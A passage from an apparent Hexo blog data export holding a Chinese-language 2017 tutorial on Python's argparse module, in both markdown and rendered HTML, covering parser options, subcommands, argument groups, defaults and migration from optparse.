parser.parse_args() and add additional ArgumentParser.add_argument() calls for the positional arguments. Keep in mind that what was previously called options, now in argparse context is called args.\n3.    Replace callback actions and the callback_* keyword arguments with type or action arguments.\n4.    Replace string names for type keyword arguments with the corresponding type objects (e.g. int, float, complex, etc).\n5.    Replace optparse.Values with Namespace and optparse.OptionError and optparse.OptionValueError with ArgumentError.\n6.    Replace strings with implicit arguments such as %default or %prog with the standard Python syntax to use dictionaries to format strings, that is, %(default)s and %(prog)s.\n7.    Replace the OptionParser constructor version argument with a call to parser.add_argument('--version', action='version', version='<the version>').","source":"_posts/Python-argparse模块详解.md","raw":"---\ntitle: Python argparse模块详解\ndate: 2017-06-08 10:27:24\ntags: Python\n---\n>    argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。\n>    官方文档中讲到的，本文基本都提到了，但只是简要记录，如果需要深入理解，可查看原文。   \n>    https://docs.python.org/3/library/argparse.html\n\n## 使用步骤\n```\nimport argparse                     # 导入模板\n\nparser = argparse.ArgumentParser()  # 创建parser\n\nparser.add_argument()               # 添加参数\n\nargs = parser.parse_args()          # 参数解析\n```\n\n## [ArgumentParser对象](https://docs.python.org/3/library/argparse.html#argumentparser-objects)\n    class argparse.ArgumentParser(\n        prog=None,                  # 设定程序名称 (defaul: sys.argv[0])\n        usage=None,                 # 替换默认的Usage信息\n        description=None,           # 程序简要信息说明(参数说明前)\n        epilog=None,                # 附加信息说明(参数说明后)\n        parents=[],                 # 继承父解析器(parser)\n        formatter_class=argparse.HelpFormatter,     # 自定义帮忙信息显示格式(4种)\n        prefix_chars='-',           # 参数前缀符号(默认为-,如：-h/--help)\n        fromfile_prefix_chars=None, # 从文件中引用参数（与在命令行直接写作用一致，解决参数过多的情况）\n        argument_default=None,      # 可设置argparse.SUPPRESS阻止默认参数默认值\n        conflict_handler='error',   # 参数冲突处理\n        add_help=True,              # 帮助信息中默认添加\"-h, --help\"描述\n        allow_abbrev=True           # 允许参数缩写\n    )\n\n## [add_argument()方法](https://docs.python.org/3/library/argparse.html#the-add-argument-method)\n    ArgumentParser.add_argument(\n        name or flags...    # 选项的名称或列表,例如：foo/-f/--foo\n        [, action]      # 采取的基本操作\n                            store(默认)         存储参数值\n                            store_const        使用该字符串选项时，取用const值\n                            store_true         使用该字符串选项时，参数值置为True\n                            store_false        使用该字符串选项时，参数值置为False\n                            append             同一个命令行中多次使用该字符串选项时，以追加的方式将值添加到list中\n                            append_const       将多个字符串选项的const值合并到一个list\n                            count              统计选项出现的次数 （如：\"-vvv\",则最终值为3）\n                            help               parser默认会添加一个help action。(一般不用理会)\n                            version            打印版本信息\n                            也可以自定义action类\n        [, nargs]       # 该参数值要求的数量\n                            数值       指明参数个数\n                            ?         提供了参数则取参数值；\n                                        无参数但声明了选项字符串则取const值；\n                                        无参数也未声明选择字符串则取default值\n                            *         所有参数存入list\n                            +         与*类似，但参数个数不能为空\n                            argparse.REMAINDER  原封不动的记录参数到list中，通常用于将这些参数传递到其它的命令行工具。\n        [, const]       # action/nargs部分要求的常值\n                            1、当action=\"store_const\"或者\"append_const\"时需要设置\n                            2、当选项为(-f/--foo),nargs='?'，同时未提供具体参数时，取用该值。\n        [, default]     # 参数默认值\n        [, type]        # 参数类型（内建参数或者函数，也可是自定义函数）\n        [, choices]     # 允许的参数值（白名单）,tuple/range\n        [, required]    # 选项是否必须，设置为True表示选项必填。\n        [, help]        # 参数说明,可以用其它类似 %(prog)s 格式调用prog值；可设置argparse.SUPPRESS使该选项在帮助信息中不可见。\n        [, metavar]     # 定义参数在Usage信息中的名称\n        [, dest]        # 解析后的属性名称\n    )\n- ### [自定义action](https://docs.python.org/3/library/argparse.html#action-classes)\n\n    class argparse.**Action**(option_strings, dest, nargs=None, const=None, default=None, type=None, choices=None, required=False, help=None, metavar=None)\n\n## [parse_args()方法](https://docs.python.org/3/library/argparse.html#the-parse-args-method)\n    ArgumentParser.parse_args(args=None, namespace=None)\n一般情况下，我们直接使用如下命令就可以了：\n```python\n# args=None, 程序将sys.argv作为参数代入\nargs = parse.parse_args()              \n\n# 给args赋值，跳过sys.argv，主要用于测试工作，避免每次运行都输入冗长的参数。\nargs = parser.parse_args(['1', '2', '3', '4'])\n\n# namespace=custom_class，将属性分配到一个已经存在的对象中。\nparser.parse_args(args=['--foo', 'BAR'], namespace=custom_class99)\n```\n\n## [其它工具](https://docs.python.org/3/library/argparse.html#other-utilities)\n\n- ### [子命令](https://docs.python.org/3/library/argparse.html#sub-commands)\n    很多程序把它的功能分到几个子程序中，比如：pip install , pip download , pip uninstall 等. 通过这种方式，可以很方便处理不同程序的参数。\n\n    ArgumentParser.**add_subparsers**([title][, description][, prog][, parser_class][, action][, option_string][, dest][, help][, metavar])\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> subparsers = parser.add_subparsers(dest='subparser_name')\n    >>> subparser1 = subparsers.add_parser('1')\n    >>> subparser1.add_argument('-x')\n    >>> subparser2 = subparsers.add_parser('2')\n    >>> subparser2.add_argument('y')\n    >>> parser.parse_args(['2', 'frobble'])\n    Namespace(subparser_name='2', y='frobble')\n\n    ```\n\n\n- ### [文件类型对象](https://docs.python.org/3/library/argparse.html#filetype-objects)\n    add_argument()中的FileType的参数\"工厂\"。\n\n    class argparse.**FileType**(mode='r', bufsize=-1, encoding=None, errors=None)\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--raw', type=argparse.FileType('wb', 0))\n    >>> parser.add_argument('out', type=argparse.FileType('w', encoding='UTF-8'))\n    >>> parser.parse_args(['--raw', 'raw.dat', 'file.txt'])\n    Namespace(out=<_io.TextIOWrapper name='file.txt' mode='w' encoding='UTF-8'>, raw=<_io.FileIO name='raw.dat' mode='wb'>)\n\n    ```\n\n- ### [参数分组](https://docs.python.org/3/library/argparse.html#argument-groups)\n    在Usage信息中的参数分组，如pip -h可以看到\"Commands\",\"General Options\"分组。\n\n    ArgumentParser.**add_argument_group**(title=None, description=None)\n\n    ```python\n    >>> parser = argparse.ArgumentParser(prog='testPROG', add_help=False)\n    >>> group1 = parser.add_argument_group('group1', 'group1 description')\n    >>> group1.add_argument('foo', help='foo help')\n    >>> group2 = parser.add_argument_group('group2', 'group2 description')\n    >>> group2.add_argument('--bar', help='bar help')\n    \n    >>> parser.print_help()\n    \n    usage: testPROG [--bar BAR] foo\n\n    group1:\n    group1 description\n\n    foo    foo help\n\n    group2:\n    group2 description\n\n    --bar BAR  bar help\n    ```\n\n- ### [互斥](https://docs.python.org/3/library/argparse.html#mutual-exclusion)\n    参数互斥！\n\n    ArgumentParser.**add_mutually_exclusive_group**(required=False)\n\n    ```python\n    >>> parser = argparse.ArgumentParser(prog='PROG')\n    >>> group = parser.add_mutually_exclusive_group(required=True)\n    >>> group.add_argument('--foo', action='store_true')\n    >>> group.add_argument('--bar', action='store_false')\n    >>> parser.parse_args([])\n    usage: PROG [-h] (--foo | --bar)\n    PROG: error: one of the arguments --foo --bar is required\n    ```\n\n- ### [解析器默认配置](https://docs.python.org/3/library/argparse.html#parser-defaults)\n    在解析器级别给参数设置默认值(优先级高于在add_argument方法中的设置)，也可以获取默认值。\n\n    ArgumentParser.**set_defaults**(**kwargs)       # 设置默认值\n\n    ArgumentParser.**get_default**(dest)            # 获取默认值\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('foo', type=int)\n    >>> parser.set_defaults(bar=42, baz='badger')   # 不审查是否在命令行中声明，故而bar，baz可以直接添加\n    >>> parser.parse_args(['736'])\n    Namespace(bar=42, baz='badger', foo=736)\n\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', default='bar') # 解析器级别默认值总是覆盖参数级别默认值\n    >>> parser.set_defaults(foo='spam')\n    >>> parser.parse_args([])\n    Namespace(foo='spam')\n\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', default='badger')\n    >>> parser.get_default('foo')                   # 获取默认值\n    'badger'\n\n    ```\n\n- ### [打印帮忙](https://docs.python.org/3/library/argparse.html#printing-help)\n    用于打印帮助信息。\n\n    ArgumentParser.**print_usage**(file=None)\n\n    ArgumentParser.**print_help**(file=None)\n\n    ArgumentParser.**format_usage**()\n\n    ArgumentParser.**format_help**()\n\n- ### [部分解析](https://docs.python.org/3/library/argparse.html#partial-parsing)\n    有些脚本只解析部分参数，放过其余的参数以便传递给其它脚本或程序。 这种情况下使用 parse_known_args() 。跟parse_args()用法一样，但当参数过多的情况下并不会报错，而是将多余的参数放到一个新的tuple中。\n\n    ArgumentParser.**parse_known_args**(args=None, namespace=None)\n\n    ```python\n    >>> parser = argparse.ArgumentParser()\n    >>> parser.add_argument('--foo', action='store_true')\n    >>> parser.add_argument('bar')\n    >>> parser.parse_known_args(['--foo', '--badger', 'BAR', 'spam'])\n    (Namespace(bar='BAR', foo=True), ['--badger', 'spam'])     # ['--badger', 'spam']即为多余的参数。\n    ```\n\n- ### [自定义文件解析](https://docs.python.org/3/library/argparse.html#customizing-file-parsing)\n\n- ### [退出方法](https://docs.python.org/3/library/argparse.html#exiting-methods)\n\n- ### [optparse代码升级](https://docs.python.org/3/library/argparse.html#upgrading-optparse-code)\n    原本argparse是与optparse保持兼容的，但是！@#￥%……&*（。升级办法如下：\n1.    Replace all optparse.OptionParser.add_option() calls with ArgumentParser.add_argument() calls.\n2.    Replace (options, args) = parser.parse_args() with args = parser.parse_args() and add additional ArgumentParser.add_argument() calls for the positional arguments. Keep in mind that what was previously called options, now in argparse context is called args.\n3.    Replace callback actions and the callback_* keyword arguments with type or action arguments.\n4.    Replace string names for type keyword arguments with the corresponding type objects (e.g. int, float, complex, etc).\n5.    Replace optparse.Values with Namespace and optparse.OptionError and optparse.OptionValueError with ArgumentError.\n6.    Replace strings with implicit arguments such as %default or %prog with the standard Python syntax to use dictionaries to format strings, that is, %(default)s and %(prog)s.\n7.    Replace the OptionParser constructor version argument with a call to parser.add_argument('--version', action='version', version='<the version>').","slug":"Python-argparse模块详解","published":1,"updated":"2017-06-08T12:42:38.000Z","_id":"cj3oaflt90003a8uv403yu5c1","comments":1,"layout":"post","photos":[],"link":"","content":"<blockquote>\n<p>   argparse是python用于解析命令行参数和选项的标准模块，用于代替已经过时的optparse模块。<br>   官方文档中讲到的，本文基本都提到了，但只是简要记录，如果需要深入理解，可查看原文。<br>   <a href=\"https://docs.python.org/3/library/argparse.html\" target=\"_blank\" rel=\"external\">https://docs.python.org/3/library/argparse.html</a></p>\n</blockquote>\n<h2 id=\"使用步骤\"><a href=\"#使用步骤\" class=\"headerlink\" title=\"使用步骤\"></a>使用步骤</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">import argparse                     # 导入模板</div><div class=\"line\"></div><div class=\"line\">parser = argparse.ArgumentParser()  # 创建parser</div><div class=\"line\"></div><div class=\"line\">parser.add_argument()               # 添加参数</div><div class=\"line\"></div><div class=\"line\">args = parser.parse_args()          # 参数解析</div></pre></td></tr></table></figure>\n<h2 id=\"ArgumentParser对象\"><a href=\"#ArgumentParser对象\" class=\"headerlink\" title=\"ArgumentParser对象\"></a><a href=\"https://docs.python.org/3/library/argparse.html#argumentparser-objects\" target=\"_blank\" rel=\"external\">ArgumentParser对象</a></h2><pre><code>class argparse.ArgumentParser(\n    prog=None,                  # 设定程序名称 (defaul: sys.argv[0])\n    usage=None,                 # 替换默认的Usage信息\n    description=None,           # 程序简要信息说明(参数说明前)\n    epilog=None,                # 附加信息说明(参数说明后)\n    parents=[],                 # 继承父解析器(parser)\n    formatter_class=argparse.HelpFormatter,     # 自定义帮忙信息显示格式(4种)\n    prefix_chars=&apos;-&apos;,           # 参数前缀符号(默认为-,如：-h/--help)\n    fromfile_prefix_chars=None, # 从文件中引用参数（与在命令行直接写作用一致，解决参数过多的情况）\n    argument_default=None,      # 可设置argparse.SUPPRESS阻止默认参数默认值\n    conflict_handler=&apos;error&apos;,   # 参数冲突处理\n    add_help=True,              # 帮助信息中默认添加&quot;-h, --help&quot;描述\n    allow_abbrev=True           # 允许参数缩写\n)\n</code></pre><h2 id=\"add-argument-方法\"><a href=\"#add-argument-方法\" class=\"headerlink\" title=\"add_argument()方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#the-add-argument-method\" target=\"_blank\" rel=\"external\">add_argument()方法</a></h2><pre><code>ArgumentParser.add_argument(\n    name or flags...    # 选项的名称或列表,例如：foo/-f/--foo\n    [, action]      # 采取的基本操作\n                        store(默认)         存储参数值\n                        store_const        使用该字符串选项时，取用const值\n                        store_true         使用该字符串选项时，参数值置为True\n                        store_false        使用该字符串选项时，参数值置为False\n                        append             同一个命令行中多次使用该字符串选项时，以追加的方式将值添加到list中\n                        append_const       将多个字符串选项的const值合并到一个list\n                        count              统计选项出现的次数 （如：&quot;-vvv&quot;,则最终值为3）\n                        help               parser默认会添加一个help action。(一般不用理会)\n                        version            打印版本信息\n                        也可以自定义action类\n    [, nargs]       # 该参数值要求的数量\n                        数值       指明参数个数\n                        ?         提供了参数则取参数值；\n                                    无参数但声明了选项字符串则取const值；\n                                    无参数也未声明选择字符串则取default值\n                        *         所有参数存入list\n                        +         与*类似，但参数个数不能为空\n                        argparse.REMAINDER  原封不动的记录参数到list中，通常用于将这些参数传递到其它的命令行工具。\n    [, const]       # action/nargs部分要求的常值\n                        1、当action=&quot;store_const&quot;或者&quot;append_const&quot;时需要设置\n                        2、当选项为(-f/--foo),nargs=&apos;?&apos;，同时未提供具体参数时，取用该值。\n    [, default]     # 参数默认值\n    [, type]        # 参数类型（内建参数或者函数，也可是自定义函数）\n    [, choices]     # 允许的参数值（白名单）,tuple/range\n    [, required]    # 选项是否必须，设置为True表示选项必填。\n    [, help]        # 参数说明,可以用其它类似 %(prog)s 格式调用prog值；可设置argparse.SUPPRESS使该选项在帮助信息中不可见。\n    [, metavar]     # 定义参数在Usage信息中的名称\n    [, dest]        # 解析后的属性名称\n)\n</code></pre><ul>\n<li><h3 id=\"自定义action\"><a href=\"#自定义action\" class=\"headerlink\" title=\"自定义action\"></a><a href=\"https://docs.python.org/3/library/argparse.html#action-classes\" target=\"_blank\" rel=\"external\">自定义action</a></h3><p>  class argparse.<strong>Action</strong>(option_strings, dest, nargs=None, const=None, default=None, type=None, choices=None, required=False, help=None, metavar=None)</p>\n</li>\n</ul>\n<h2 id=\"parse-args-方法\"><a href=\"#parse-args-方法\" class=\"headerlink\" title=\"parse_args()方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#the-parse-args-method\" target=\"_blank\" rel=\"external\">parse_args()方法</a></h2><pre><code>ArgumentParser.parse_args(args=None, namespace=None)\n</code></pre><p>一般情况下，我们直接使用如下命令就可以了：<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># args=None, 程序将sys.argv作为参数代入</span></div><div class=\"line\">args = parse.parse_args()              </div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># 给args赋值，跳过sys.argv，主要用于测试工作，避免每次运行都输入冗长的参数。</span></div><div class=\"line\">args = parser.parse_args([<span class=\"string\">'1'</span>, <span class=\"string\">'2'</span>, <span class=\"string\">'3'</span>, <span class=\"string\">'4'</span>])</div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\"># namespace=custom_class，将属性分配到一个已经存在的对象中。</span></div><div class=\"line\">parser.parse_args(args=[<span class=\"string\">'--foo'</span>, <span class=\"string\">'BAR'</span>], namespace=custom_class99)</div></pre></td></tr></table></figure></p>\n<h2 id=\"其它工具\"><a href=\"#其它工具\" class=\"headerlink\" title=\"其它工具\"></a><a href=\"https://docs.python.org/3/library/argparse.html#other-utilities\" target=\"_blank\" rel=\"external\">其它工具</a></h2><ul>\n<li><h3 id=\"子命令\"><a href=\"#子命令\" class=\"headerlink\" title=\"子命令\"></a><a href=\"https://docs.python.org/3/library/argparse.html#sub-commands\" target=\"_blank\" rel=\"external\">子命令</a></h3><p>  很多程序把它的功能分到几个子程序中，比如：pip install , pip download , pip uninstall 等. 通过这种方式，可以很方便处理不同程序的参数。</p>\n<p>  ArgumentParser.<strong>add_subparsers</strong>([title][, description][, prog][, parser_class][, action][, option_string][, dest][, help][, metavar])</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparsers = parser.add_subparsers(dest=<span class=\"string\">'subparser_name'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser1 = subparsers.add_parser(<span class=\"string\">'1'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser1.add_argument(<span class=\"string\">'-x'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser2 = subparsers.add_parser(<span class=\"string\">'2'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>subparser2.add_argument(<span class=\"string\">'y'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'2'</span>, <span class=\"string\">'frobble'</span>])</div><div class=\"line\">Namespace(subparser_name=<span class=\"string\">'2'</span>, y=<span class=\"string\">'frobble'</span>)</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"文件类型对象\"><a href=\"#文件类型对象\" class=\"headerlink\" title=\"文件类型对象\"></a><a href=\"https://docs.python.org/3/library/argparse.html#filetype-objects\" target=\"_blank\" rel=\"external\">文件类型对象</a></h3><p>  add_argument()中的FileType的参数”工厂”。</p>\n<p>  class argparse.<strong>FileType</strong>(mode=’r’, bufsize=-1, encoding=None, errors=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--raw'</span>, type=argparse.FileType(<span class=\"string\">'wb'</span>, <span class=\"number\">0</span>))</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'out'</span>, type=argparse.FileType(<span class=\"string\">'w'</span>, encoding=<span class=\"string\">'UTF-8'</span>))</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'--raw'</span>, <span class=\"string\">'raw.dat'</span>, <span class=\"string\">'file.txt'</span>])</div><div class=\"line\">Namespace(out=&lt;_io.TextIOWrapper name=<span class=\"string\">'file.txt'</span> mode=<span class=\"string\">'w'</span> encoding=<span class=\"string\">'UTF-8'</span>&gt;, raw=&lt;_io.FileIO name=<span class=\"string\">'raw.dat'</span> mode=<span class=\"string\">'wb'</span>&gt;)</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"参数分组\"><a href=\"#参数分组\" class=\"headerlink\" title=\"参数分组\"></a><a href=\"https://docs.python.org/3/library/argparse.html#argument-groups\" target=\"_blank\" rel=\"external\">参数分组</a></h3><p>  在Usage信息中的参数分组，如pip -h可以看到”Commands”,”General Options”分组。</p>\n<p>  ArgumentParser.<strong>add_argument_group</strong>(title=None, description=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser(prog=<span class=\"string\">'testPROG'</span>, add_help=<span class=\"keyword\">False</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group1 = parser.add_argument_group(<span class=\"string\">'group1'</span>, <span class=\"string\">'group1 description'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group1.add_argument(<span class=\"string\">'foo'</span>, help=<span class=\"string\">'foo help'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group2 = parser.add_argument_group(<span class=\"string\">'group2'</span>, <span class=\"string\">'group2 description'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group2.add_argument(<span class=\"string\">'--bar'</span>, help=<span class=\"string\">'bar help'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.print_help()</div><div class=\"line\"></div><div class=\"line\">usage: testPROG [--bar BAR] foo</div><div class=\"line\"></div><div class=\"line\">group1:</div><div class=\"line\">group1 description</div><div class=\"line\"></div><div class=\"line\">foo    foo help</div><div class=\"line\"></div><div class=\"line\">group2:</div><div class=\"line\">group2 description</div><div class=\"line\"></div><div class=\"line\">--bar BAR  bar help</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"互斥\"><a href=\"#互斥\" class=\"headerlink\" title=\"互斥\"></a><a href=\"https://docs.python.org/3/library/argparse.html#mutual-exclusion\" target=\"_blank\" rel=\"external\">互斥</a></h3><p>  参数互斥！</p>\n<p>  ArgumentParser.<strong>add_mutually_exclusive_group</strong>(required=False)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser(prog=<span class=\"string\">'PROG'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group = parser.add_mutually_exclusive_group(required=<span class=\"keyword\">True</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group.add_argument(<span class=\"string\">'--foo'</span>, action=<span class=\"string\">'store_true'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>group.add_argument(<span class=\"string\">'--bar'</span>, action=<span class=\"string\">'store_false'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([])</div><div class=\"line\">usage: PROG [-h] (--foo | --bar)</div><div class=\"line\">PROG: error: one of the arguments --foo --bar <span class=\"keyword\">is</span> required</div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"解析器默认配置\"><a href=\"#解析器默认配置\" class=\"headerlink\" title=\"解析器默认配置\"></a><a href=\"https://docs.python.org/3/library/argparse.html#parser-defaults\" target=\"_blank\" rel=\"external\">解析器默认配置</a></h3><p>  在解析器级别给参数设置默认值(优先级高于在add_argument方法中的设置)，也可以获取默认值。</p>\n<p>  ArgumentParser.<strong>set_defaults</strong>(**kwargs)       # 设置默认值</p>\n<p>  ArgumentParser.<strong>get_default</strong>(dest)            # 获取默认值</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'foo'</span>, type=int)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.set_defaults(bar=<span class=\"number\">42</span>, baz=<span class=\"string\">'badger'</span>)   <span class=\"comment\"># 不审查是否在命令行中声明，故而bar，baz可以直接添加</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([<span class=\"string\">'736'</span>])</div><div class=\"line\">Namespace(bar=<span class=\"number\">42</span>, baz=<span class=\"string\">'badger'</span>, foo=<span class=\"number\">736</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, default=<span class=\"string\">'bar'</span>) <span class=\"comment\"># 解析器级别默认值总是覆盖参数级别默认值</span></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.set_defaults(foo=<span class=\"string\">'spam'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_args([])</div><div class=\"line\">Namespace(foo=<span class=\"string\">'spam'</span>)</div><div class=\"line\"></div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, default=<span class=\"string\">'badger'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.get_default(<span class=\"string\">'foo'</span>)                   <span class=\"comment\"># 获取默认值</span></div><div class=\"line\"><span class=\"string\">'badger'</span></div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"打印帮忙\"><a href=\"#打印帮忙\" class=\"headerlink\" title=\"打印帮忙\"></a><a href=\"https://docs.python.org/3/library/argparse.html#printing-help\" target=\"_blank\" rel=\"external\">打印帮忙</a></h3><p>  用于打印帮助信息。</p>\n<p>  ArgumentParser.<strong>print_usage</strong>(file=None)</p>\n<p>  ArgumentParser.<strong>print_help</strong>(file=None)</p>\n<p>  ArgumentParser.<strong>format_usage</strong>()</p>\n<p>  ArgumentParser.<strong>format_help</strong>()</p>\n</li>\n<li><h3 id=\"部分解析\"><a href=\"#部分解析\" class=\"headerlink\" title=\"部分解析\"></a><a href=\"https://docs.python.org/3/library/argparse.html#partial-parsing\" target=\"_blank\" rel=\"external\">部分解析</a></h3><p>  有些脚本只解析部分参数，放过其余的参数以便传递给其它脚本或程序。 这种情况下使用 parse_known_args() 。跟parse_args()用法一样，但当参数过多的情况下并不会报错，而是将多余的参数放到一个新的tuple中。</p>\n<p>  ArgumentParser.<strong>parse_known_args</strong>(args=None, namespace=None)</p>\n  <figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser = argparse.ArgumentParser()</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'--foo'</span>, action=<span class=\"string\">'store_true'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.add_argument(<span class=\"string\">'bar'</span>)</div><div class=\"line\"><span class=\"meta\">&gt;&gt;&gt; </span>parser.parse_known_args([<span class=\"string\">'--foo'</span>, <span class=\"string\">'--badger'</span>, <span class=\"string\">'BAR'</span>, <span class=\"string\">'spam'</span>])</div><div class=\"line\">(Namespace(bar=<span class=\"string\">'BAR'</span>, foo=<span class=\"keyword\">True</span>), [<span class=\"string\">'--badger'</span>, <span class=\"string\">'spam'</span>])     <span class=\"comment\"># ['--badger', 'spam']即为多余的参数。</span></div></pre></td></tr></table></figure>\n</li>\n<li><h3 id=\"自定义文件解析\"><a href=\"#自定义文件解析\" class=\"headerlink\" title=\"自定义文件解析\"></a><a href=\"https://docs.python.org/3/library/argparse.html#customizing-file-parsing\" target=\"_blank\" rel=\"external\">自定义文件解析</a></h3></li>\n<li><h3 id=\"退出方法\"><a href=\"#退出方法\" class=\"headerlink\" title=\"退出方法\"></a><a href=\"https://docs.python.org/3/library/argparse.html#exiting-methods\" target=\"_blank\" rel=\"external\">退出方法</a></h3></li>\n<li><h3 id=\"optparse代码升级\"><a href=\"#optparse代码升级\" class=\"headerlink\" title=\"optparse代码升级\"></a><a href=\"https://docs.python.org/3/library/argparse.html#upgrading-optparse-code\" target=\"_blank\" rel=\"external\">optparse代码升级</a></h3><p>  原本argparse是与optparse保持兼容的，但是！@#￥%……&amp;*（。升级办法如下：</p>\n</li>\n</ul>\n<ol>\n<li>Replace all optparse.OptionParser.add_option() calls with ArgumentParser.add_argument() calls.</li>\n<li>Replace (options, args) = parser.parse_args() with args = parser.parse_args() and add additional ArgumentParser.add_argument() calls for the positional arguments. Keep in mind that what was previously called options, now in argparse context is called args.</li>\n<li>Replace callback actions and the callback_* keyword arguments with type or action arguments.</li>\n<li>Replace string names for type 